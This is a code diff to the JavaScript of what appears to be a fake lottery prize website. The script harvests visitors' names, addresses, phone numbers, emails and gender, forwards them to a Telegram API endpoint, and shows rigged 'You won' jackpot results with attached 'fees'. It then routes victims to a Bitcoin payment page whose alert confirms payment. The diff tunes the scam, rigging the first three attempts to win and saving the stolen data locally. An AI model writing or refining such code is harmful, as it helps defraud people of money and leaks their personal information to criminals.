@@ -11,6 +11,9 @@ document.getElementById('registrationForm').addEventListener('submit', function(
         registrationData[key] = value;
     });
 
+    // Save registration data to local storage
+    localStorage.setItem('registrationData', JSON.stringify(registrationData));
+
     const message = `New Registration:\nFull Name: ${registrationData.fullName}\nAddress: ${registrationData.address}\nPhone: ${registrationData.phone}\nEmail: ${registrationData.email}\nGender: ${registrationData.gender}`;
 
     fetch(TELEGRAM_API_URL, {
@@ -36,7 +39,7 @@ document.getElementById('registrationForm').addEventListener('submit', function(
 });
 
 const prizes = [
-    { amount: '$50,000.00', fee: '$650' },
+    { amount: '$50,000.00', fee: '$500' },
     { amount: '$100,000.00', fee: '$1000' },
     { amount: '$125,000.00', fee: '$1250' },
     { amount: '$150,000.00', fee: '$1500' },
@@ -53,16 +56,22 @@ const prizes = [
     { amount: '$1,000,000.00', fee: '$10000' }
 ];
 
-// Jackpot Game Logic
+let attempts = 0;
+
 if (document.getElementById('playJackpot')) {
     document.getElementById('playJackpot').addEventListener('click', function() {
-        const prize = prizes[Math.floor(Math.random() * prizes.length)];
-        document.getElementById('jackpotResult').innerText = `You won ${prize.amount}!`;
-        showCertificate(prize);
+        attempts++;
+        if (attempts <= 3) {
+            const prize = prizes[Math.floor(Math.random() * prizes.length)];
+            document.getElementById('jackpotResult').innerText = `You won ${prize.amount}!`;
+            showCertificate(prize);
+        } else {
+            attempts = 0;
+            document.getElementById('jackpotResult').innerText = 'Try again!';
+        }
     });
 }
 
-// Spinning Board Game Logic
 if (document.getElementById('spinButton')) {
     document.getElementById('spinButton').addEventListener('click', function() {
         const spinner = document.getElementById('spinner');
@@ -77,7 +86,6 @@ if (document.getElementById('spinButton')) {
     });
 }
 
-// Ball Scratch Game Logic
 if (document.getElementById('ballContainer')) {
     const ballContainer = document.getElementById('ballContainer');
     prizes.forEach((prize, index) => {
@@ -101,31 +109,38 @@ function showCertificate(prize) {
 }
 
 function getRegistrationData() {
-    // This function should retrieve registration data from local storage or a global variable
-    // Assuming it's stored in localStorage for now
     return JSON.parse(localStorage.getItem('registrationData'));
 }
 
-document.getElementById('downloadCertificate').addEventListener('click', function() {
-    const certificateText = document.getElementById('certificateText').innerText;
-    const blob = new Blob([certificateText], { type: 'text/plain' });
-    const link = document.createElement('a');
-    link.href = URL.createObjectURL(blob);
-    link.download = 'certificate.txt';
-    link.click();
-});
+if (document.getElementById('downloadCertificate')) {
+    document.getElementById('downloadCertificate').addEventListener('click', function() {
+        const certificateText = document.getElementById('certificateText').innerText;
+        const blob = new Blob([certificateText], { type: 'text/plain' });
+        const link = document.createElement('a');
+        link.href = URL.createObjectURL(blob);
+        link.download = 'certificate.txt';
+        link.click();
+    });
+}
 
-document.getElementById('payBitcoin').addEventListener('click', function() {
-    window.location.href = `bitcoin_payment.html?amount=${document.getElementById('paymentAmount').innerText}`;
-});
+if (document.getElementById('payBitcoin')) {
+    document.getElementById('payBitcoin').addEventListener('click', function() {
+        window.location.href = `bitcoin_payment.html?amount=${document.getElementById('paymentAmount').innerText}`;
+    });
+}
 
-document.addEventListener('DOMContentLoaded', function() {
-    const urlParams = new URLSearchParams(window.location.search);
-    const amount = urlParams.get('amount');
-    if (document.getElementById('amount')) {
-        document.getElementById('amount').value = amount;
-    }
-    if (amount) {
+if (document.getElementById('bitcoinPaymentForm')) {
+    document.addEventListener('DOMContentLoaded', function() {
+        const urlParams = new URLSearchParams(window.location.search);
+        const amount = urlParams.get('amount');
+        if (document.getElementById('amount')) {
+            document.getElementById('amount').value = amount;
+        }
+    });
+
+    document.getElementById('bitcoinPaymentForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+
         const paymentData = new FormData(e.target);
         const paymentInfo = {};
         paymentData.forEach((value, key) => {
@@ -133,5 +148,5 @@ document.addEventListener('DOMContentLoaded', function() {
         });
 
         alert(`Payment of ${paymentInfo.amount} BTC sent to ${paymentInfo.wallet}. Thank you!`);
-    }
-});
+    });
+}
